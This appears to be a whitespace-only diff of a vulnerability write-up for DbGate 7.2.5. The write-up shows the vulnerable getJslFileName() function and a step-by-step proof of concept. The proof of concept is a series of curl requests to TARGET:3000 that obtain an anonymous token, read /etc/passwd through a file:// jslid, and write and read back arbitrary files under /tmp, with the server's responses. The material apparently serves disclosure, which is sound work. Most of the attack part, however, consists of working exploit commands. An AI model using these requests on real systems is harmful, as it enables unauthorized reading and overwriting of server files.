@@ -23,10 +23,10 @@ The `getJslFileName()` function parses `file://` URLs and returns the raw filesy
 
 ```javascript
 function getJslFileName(jslid) {
-    if (jslid.startsWith('file://')) {
-        return jslid.substring(7);  // Returns raw path, e.g., /etc/passwd
-    }
-    // ... other protocol handling
+ if (jslid.startsWith('file://')) {
+ return jslid.substring(7); // Returns raw path, e.g., /etc/passwd
+ }
+ // ... other protocol handling
 }
 ```
 
@@ -48,17 +48,17 @@ Verified on DbGate 7.2.5 Docker (default anonymous deployment, port 3000):
 
 ```bash
 curl -s -X POST http://TARGET:3000/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"amoid":"none"}'
+ -H "Content-Type: application/json" \
+ -d '{"amoid":"none"}'
 ```
 
 **Step 2: Read arbitrary file via `jsldata/get-info`**
 
 ```bash
 curl -s -X POST http://TARGET:3000/jsldata/get-info \
-  -H "Authorization: Bearer <JWT>" \
-  -H "Content-Type: application/json" \
-  -d '{"jslid":"file:///etc/passwd"}'
+ -H "Authorization: Bearer <JWT>" \
+ -H "Content-Type: application/json" \
+ -d '{"jslid":"file:///etc/passwd"}'
 ```
 ```
 null
@@ -70,9 +70,9 @@ The `null` response (instead of an error) confirms the file exists and was acces
 
 ```bash
 curl -s -X POST http://TARGET:3000/jsldata/save-text \
-  -H "Authorization: Bearer <JWT>" \
-  -H "Content-Type: application/json" \
-  -d '{"jslid":"file:///tmp/pwned.txt","text":"HACKED"}'
+ -H "Authorization: Bearer <JWT>" \
+ -H "Content-Type: application/json" \
+ -d '{"jslid":"file:///tmp/pwned.txt","text":"HACKED"}'
 ```
 ```
 true
@@ -83,9 +83,9 @@ true
 ```bash
 # Write a JSONL file
 curl -s -X POST http://TARGET:3000/jsldata/save-text \
-  -H "Authorization: Bearer <JWT>" \
-  -H "Content-Type: application/json" \
-  -d '{"jslid":"file:///tmp/secrets.jsonl","text":"{\"password\":\"s3cr3t\"}"}'
+ -H "Authorization: Bearer <JWT>" \
+ -H "Content-Type: application/json" \
+ -d '{"jslid":"file:///tmp/secrets.jsonl","text":"{\"password\":\"s3cr3t\"}"}'
 ```
 ```
 true
@@ -94,9 +94,9 @@ true
 ```bash
 # Read it back
 curl -s -X POST http://TARGET:3000/jsldata/get-rows \
-  -H "Authorization: Bearer <JWT>" \
-  -H "Content-Type: application/json" \
-  -d '{"jslid":"file:///tmp/secrets.jsonl","offset":0,"limit":10}'
+ -H "Authorization: Bearer <JWT>" \
+ -H "Content-Type: application/json" \
+ -d '{"jslid":"file:///tmp/secrets.jsonl","offset":0,"limit":10}'
 ```
 ```
 [{"password":"s3cr3t"}]
